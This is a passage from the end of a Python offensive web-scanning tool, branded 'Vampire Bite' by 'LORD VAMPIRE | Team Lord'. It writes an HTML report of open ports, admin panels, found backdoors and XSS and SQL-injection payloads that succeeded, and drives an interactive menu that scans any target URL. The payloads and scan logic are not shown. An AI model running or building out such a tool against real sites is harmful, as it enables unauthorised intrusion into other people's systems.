{''.join([f"<tr><td class='critical'>{p}</td><td>{self.get_service_name(p)}</td></tr>" for p in self.results['open_ports']])}
</table>

<h2>👑 ADMIN PANELS ({len(self.results['admin_panels'])})</h2>
{''.join([f"<div style='background:#111; padding:5px; margin:5px 0;'><a href='{a['url']}' style='color:#0f0;'>{a['url']}</a> - {a['type']}</div>" for a in self.results['admin_panels']])}

<h2>💀 BACKDOORS ({len(self.results['backdoors'])})</h2>
{''.join([f"<div style='background:#111; padding:5px; margin:5px 0;'><a href='{b['url']}' style='color:#f00;'>{b['file']}</a></div>" for b in self.results['backdoors']])}

<h2>⚠️ VULNERABILITIES</h2>
<h3>XSS ({len(self.results['xss_vulnerable'])})</h3>
<ul>{''.join([f"<li>{x['payload']}</li>" for x in self.results['xss_vulnerable'][:10]])}</ul>
<h3>SQLi ({len(self.results['sql_vulnerable'])})</h3>
<ul>{''.join([f"<li>{s['payload']}</li>" for s in self.results['sql_vulnerable'][:10]])}</ul>

<div class="footer">
<p>🐺 Created by LORD VAMPIRE | Team Lord</p>
</div>
</div>
</body></html>"""
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        return filename
    
    def run(self):
        self.banner()
        while True:
            print(f"""
{Fore.RED}╔════════════════════════════════════════════════════════════════════════════════╗
║  {Fore.GREEN}[1]{Style.RESET_ALL} 🧛‍♂️ {Fore.RED}VAMPIRE BITE{Style.RESET_ALL} - COMPLETE SCAN (All Features)                    {Fore.RED}║
║  {Fore.GREEN}[2]{Style.RESET_ALL} 🔍 QUICK SCAN (Ports + Web Server Only)                           {Fore.RED}║
║  {Fore.GREEN}[0]{Style.RESET_ALL} 🚪 EXIT                                                        {Fore.RED}║
╚════════════════════════════════════════════════════════════════════════════════╝
""")
            choice = input(f"{Fore.RED}┌─[{Fore.YELLOW}VAMPIRE{Fore.RED}]~[{Fore.GREEN}> {Style.RESET_ALL}")
            
            if choice == "1":
                target = input(f"{Fore.CYAN}Target URL (example.com): {Style.RESET_ALL}")
                self.full_scan(target)
                input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
            elif choice == "2":
                target = input(f"{Fore.CYAN}Target URL: {Style.RESET_ALL}")
                if not target.startswith(('http://', 'https://')):
                    target = 'https://' + target
                ip = urlparse(target).hostname
                self.port_scan(ip)
                self.detect_web_server(target)
                input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
            elif choice == "0":
                print(f"\n{Fore.RED}🧛‍♂️ VAMPIRE BITE OUT. THE WEB BLEEDS!{Style.RESET_ALL}")
                break

if __name__ == "__main__":
    hunter = VampireBiteComplete()
    hunter.run()
